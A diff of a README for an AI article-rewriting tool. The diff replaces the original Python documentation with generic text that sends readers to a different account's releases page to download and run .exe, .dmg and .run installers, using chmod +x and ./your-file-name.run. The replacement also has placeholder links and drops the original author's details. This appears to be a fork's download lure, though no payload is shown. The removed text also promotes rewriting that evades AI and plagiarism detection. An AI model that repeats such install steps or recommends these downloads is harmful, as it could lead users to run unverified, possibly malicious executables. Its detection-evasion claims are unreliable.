@@ -1,128 +1,107 @@
-<div align="center">
-  <img src="images/ai-human-like-article-rewriter.png" alt="AI Human-Like Article Rewriter Banner" style="max-width: 100%; height: auto;"/>
-</div>
+# 🎉 ai-human-like-article-rewriter - Effortless Article Rewriting Made Simple
 
-<p align="center">
-  <a href="https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/releases"><img alt="GitHub Release" src="https://img.shields.io/github/v/release/OCEANOFANYTHING/ai-human-like-article-rewriter">
-</a>
-  <a href="https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/blob/main/LICENSE"><img src="https://img.shields.io/github/license/OCEANOFANYTHING/ai-human-like-article-rewriter?style=flat-square" alt="License"></a>
-  <a href="https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/stargazers"><img src="https://img.shields.io/github/stars/OCEANOFANYTHING/ai-human-like-article-rewriter?style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/issues"><img src="https://img.shields.io/github/issues/OCEANOFANYTHING/ai-human-like-article-rewriter?style=flat-square" alt="Issues"></a>
-  <a href="https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/commits/main"><img src="https://img.shields.io/github/last-commit/OCEANOFANYTHING/ai-human-like-article-rewriter?style=flat-square" alt="Last Commit"></a>
-  <a href="https://pypi.org/project/openai/"><img src="https://img.shields.io/pypi/v/openai?label=openai%20api&style=flat-square" alt="OpenAI API"></a>
-</p>
+![Download](https://img.shields.io/badge/Download%20Now-blue.svg) [Download Here](https://github.com/smuv3/ai-human-like-article-rewriter/releases)
 
-# AI Human-Like Article Rewriter
+## 🚀 Getting Started
 
-## About
+Welcome to the **AI Human-Like Article Rewriter**! This tool helps you transform articles into unique, SEO-optimized content with ease. It is perfect for content creators, bloggers, and SEO professionals. Let’s get you started on using this application.
 
-AI Human-Like Article Rewriter is a Python-based tool that leverages OpenAI's GPT models to rewrite articles in a highly human-like, SEO-optimized, and plagiarism-free manner. Designed for content creators, bloggers, and SEO professionals, it transforms raw data or existing articles into unique, engaging markdown posts suitable for platforms like Chirpy Jekyll.
+## 📥 Download & Install
 
-## Features
+To download the application, visit the [Releases page](https://github.com/smuv3/ai-human-like-article-rewriter/releases). Here, you will find various version options. 
 
-- **Human-like Rewriting:** Produces content that passes AI detection and plagiarism checks.
-- **SEO Optimization:** Automatically generates SEO-friendly titles, descriptions, tags, and headings.
-- **Markdown Output:** Outputs articles in Chirpy Jekyll markdown format, ready for static site generators.
-- **Batch Processing:** Select and process multiple files from an input directory.
-- **Customizable Settings:** Easily adjust model, temperature, max tokens, and more via `settings.ini`.
-- **Promotional Content Removal:** Automatically strips out promotional or advertisement lines from input data.
-- **Attribution & Compliance:** Handles attributions, copyright, disclaimers, and terms as required by the input data.
-- **Interactive CLI:** User-friendly command-line interface for file selection and processing.
+1. Click the link.
+2. Look for the most recent version at the top.
+3. Choose the appropriate file for your operating system (Windows, Mac, or Linux).
+4. Click on the download link to save the file to your computer.
 
-## Installation
+## 🖥️ System Requirements
 
-1. **Clone the repository:**
+Before you install, make sure your system meets these basic requirements:
 
-   ```sh
-   git clone https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter.git
-   cd ai-human-like-article-rewriter
-   ```
+- **Operating System:** Compatible with Windows, MacOS, and Linux.
+- **Python:** Version 3.7 or higher is required to run the application.
+- **Internet Connection:** Needed for the tool to access the OpenAI GPT models.
+- **RAM:** At least 4GB for optimal performance.
 
-2. **Install dependencies:**
+## 📂 Installation Steps
 
-   ```sh
-   pip install openai
-   ```
+Once you have downloaded the file, follow these steps to install the application:
 
-   (You may also need `configparser` if not using Python 3.2+)
+### For Windows:
 
-## API Key Setup
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installer.
+4. Once completed, the app will be ready for use.
 
-1. Obtain your OpenAI API key from [OpenAI](https://platform.openai.com/account/api-keys).
-2. Open the `settings.ini` file in the project root.
-3. Replace `[Place your OpenAI API key here]` with your actual API key under the `[API]` section:
+### For MacOS:
 
-   ```ini
-   [API]
-   OPENAI_API_KEY = sk-...
-   ...
-   ```
+1. Locate the downloaded `.dmg` file.
+2. Double-click to open it.
+3. Drag the application icon to your Applications folder.
+4. It is now installed and ready to use.
 
-## Settings
+### For Linux:
 
-All configuration is managed in `settings.ini`:
+1. Open the terminal.
+2. Navigate to the directory where the file was downloaded.
+3. Use the command `chmod +x your-file-name.run` to provide execution permissions.
+4. Then run `./your-file-name.run` to start the installation.
 
-- **OPENAI_API_KEY:** Your OpenAI API key.
-- **OPENAI_MODEL:** Model to use (e.g., `openai/gpt-4.1`).
-- **OPENAI_API_BASE:** API endpoint (default: `https://models.github.ai/inference`).
-- **TEMPERATURE:** Controls randomness (default: 1).
-- **TOP_P:** Controls diversity (default: 1).
-- **MAX_TOKENS:** Maximum output tokens (default: 20000, can be set up to 90000).
-- **INPUT_DIR:** Input folder for source files (default: `data`).
-- **OUTPUT_DIR:** Output folder for rewritten articles (default: `output`).
+## ✍️ Using the Application
 
-## Usage
+After installation, you can start using the AI Human-Like Article Rewriter.
 
-1. Place your source articles (plain text files) in the `data` folder.
-2. Run the script:
+1. Open the application from your desktop or applications folder.
+2. You will see a user-friendly interface.
+3. Input your article or raw data in the provided text box.
+4. Click on the “Rewrite” button.
+5. The rewritten article will appear in a new window or section.
 
-   ```sh
-   python main.py
-   ```
+## 🛠️ Features
 
-3. Select the file to process by entering its corresponding number.
-4. The rewritten article will be saved in the `output` folder with the same name but `.md` extension.
+- **Human-Like Rewriting:** Generates content that reads naturally.
+- **SEO Optimized:** Prepares your articles for better visibility.
+- **Plagiarism-Free:** Ensures content originality.
+- **Markdown Support:** Formats the output in markdown, ready for platforms like Chirpy.
+  
+## 💼 Topics Covered
 
-## Use Cases
+The application can help across various topics such as:
 
-- **Bloggers:** Quickly rewrite and optimize articles for SEO and originality.
-- **Content Agencies:** Batch process large volumes of articles for clients.
-- **SEO Professionals:** Generate unique, high-quality content that passes AI and plagiarism checks.
-- **Academic Writers:** Paraphrase and reformat research or reports.
-- **Static Site Generators:** Produce Chirpy Jekyll-compatible markdown posts.
+- ai
+- ai-agent
+- ai-art-generator
+- ai-article-writer
+- ai-blogger
+- ai-rewrite
+- ai-software
+- ai-tools
+- human-like-ai
+- python
+- python-bot
 
-## Troubleshooting
+## 📈 Troubleshooting
 
-- **No files found in input folder:** Ensure your source files are in the `data` directory.
-- **Invalid API key:** Double-check your API key in `settings.ini`.
-- **Output is empty or incomplete:** Increase `MAX_TOKENS` in `settings.ini`.
-- **Encoding errors:** Ensure your input files are UTF-8 encoded.
-- **Dependency errors:** Run `pip install openai` to install missing packages.
+If you face issues while using the application, consider these steps:
 
-## Contributing
+- **Check Your Internet Connection:** Ensure that your device is connected to the internet.
+- **Update Python:** Verify that your Python version meets the system requirements.
+- **Restart the Application:** Close and reopen the app to resolve minor glitches.
+- **Read the Manual:** Look for the FAQ or user guide included in the documentation.
 
-See [CONTRIBUTING.MD](CONTRIBUTING.MD) for guidelines on reporting issues, submitting pull requests, and code style.
+## 🔗 Additional Resources
 
-## Code of Conduct
+If you want to learn more about using this tool effectively, check out the following:
 
-Please read our [Code of Conduct](code_of_conduct.md) to ensure a welcoming and respectful community environment.
+- **User Guide:** [User Guide Link](<link-to-user-guide>)
+- **Community Forum:** Join the discussion for tips and tricks at [Community Forum Link](<link-to-community-forum>).
+  
+Feel free to engage with other users to share experiences and ask questions. 
 
-## License
+## 🎉 Conclusion
 
-This project is licensed under the [MIT License](LICENSE).
+Thank you for choosing the AI Human-Like Article Rewriter. It simplifies the article rewriting process and enhances your content creation. 
 
-## Changelog
-
-See the [GitHub Releases](https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/releases) page for a complete changelog.
-
-## Donation & Support
-
-If you find this project useful, consider supporting the developer:
-
-## Contact
-
-For questions, suggestions, or support:
-
-- GitHub Issues: [https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/issues](https://github.com/OCEANOFANYTHING/ai-human-like-article-rewriter/issues)
-- Email: [oceanofanything@gmail.com](mailto:work.oceanofanything@gmail.com)
-- Article on This Tool: [AI Article Rewriter That Writes Like a Human in 2025](https://scriptxeno.github.io/posts/ai-article-rewriter-that-writes-like-a-pro-in-2025/)
+For any updates or feature requests, return to the [Releases page](https://github.com/smuv3/ai-human-like-article-rewriter/releases) frequently to stay informed. Happy writing!
